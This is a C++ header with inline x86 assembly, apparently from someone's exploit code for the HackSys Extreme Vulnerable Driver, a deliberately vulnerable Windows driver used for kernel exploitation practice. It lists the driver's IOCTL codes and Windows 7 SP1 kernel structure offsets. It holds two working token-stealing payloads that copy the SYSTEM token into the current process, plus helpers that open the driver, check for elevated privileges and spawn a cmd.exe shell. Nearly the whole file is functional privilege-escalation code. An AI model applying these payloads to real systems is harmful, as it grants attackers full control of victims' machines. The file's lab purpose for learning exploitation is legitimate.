#pragma once
#include <Windows.h>
#include <TlHelp32.h>

/*
	IOCTL Codes for whole driver
*/

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_NON_PAGED_POOL_OVERFLOW         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_DOUBLE_FETCH                    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80D, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80E, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_MEMORY_DISCLOSURE               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80F, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_PAGED_POOL_SESSION              CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_WRITE_NULL                      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_NEITHER, FILE_ANY_ACCESS)

using namespace std;

LPCSTR driverName = "\\\\.\\HackSysExtremeVulnerableDriver";

/*
	PAYLOADS
	
*/

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

__declspec(naked) VOID TokenStealingPayloadWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state

			; Kernel Recovery Stub
			xor eax, eax; Set NTSTATUS SUCCEESS
			; DOES NOT WORK ON MY SYSTEM; add esp, 12; Fix the stack
			pop ebp; Restore saved EBP
			ret 8; Return cleanly
	}
}

__declspec(naked) VOID TokenStealingPayloadWin7TypeConfusion() {
	// Importance of Kernel Recovery
	__asm {
		push ebp
		mov ebp, esp
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad; Restore registers state

			; Kernel Recovery Stub
			xor eax, eax; Set NTSTATUS SUCCEESS
			mov esp, ebp
			pop ebp; Restore saved EBP
			; add esp, 12; Fix the stack
			ret ; Return cleanly
	}
}

/*
	END of PAYLOADS
*/

HANDLE getDriverHandle(LPCSTR driverName) {

	HANDLE hDevice;

	cout << "\t[+] Opening device " << driverName << endl;

	hDevice = CreateFileA(driverName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		cout << "\t[!] Unable to obtain handle on device." << endl;

		if (GetLastError() == 2)
		{
			cout << "\t[!] ERROR: Specified device was not found." << endl;
		}

		exit(1);
	}

	cout << "\t[+] Device opened successfully." << endl;
	cout << "\t[+] Handle Obtained : 0x" << static_cast<void *>(hDevice) << endl;

	return hDevice;
}

VOID closeHandle(HANDLE hDevice){

	cout << "\t[+] Closing device handle." << endl;

	CloseHandle(hDevice);
}


/*
	Find process by name and get PID. 
	Ripped from here - https://stackoverflow.com/questions/865152/how-can-i-get-a-process-handle-by-its-name-in-c

*/
VOID getCmd(VOID) {

	BOOL		   success;
	PROCESSENTRY32 entry;
	
	char		cmd[] = "cmd.exe";
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	success = TRUE;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	
	cout << "\t[+] Checking if we got privileges." << endl;

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (strcmp(entry.szExeFile, "csrss.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

				if (hProcess == NULL)
				{	
					success = FALSE;
					cout << "\t\t[-] Unfortunately, exploit failed." << endl;
					return;
				}

				CloseHandle(hProcess);
			}
		}
	}

	CloseHandle(snapshot);

	cout << "\t\t[+] Exploit succeeded. Shell is coming." << endl;
	cout << "\t[+] Summoning Jutsu: Shell.exe" << endl;

	if (!CreateProcess(NULL,   // No module name (use command line)
		cmd,			// Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		CREATE_NEW_CONSOLE,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		cout << "\t\t[-] Seems like you are out of chakra" << endl;
		return;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, 0);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
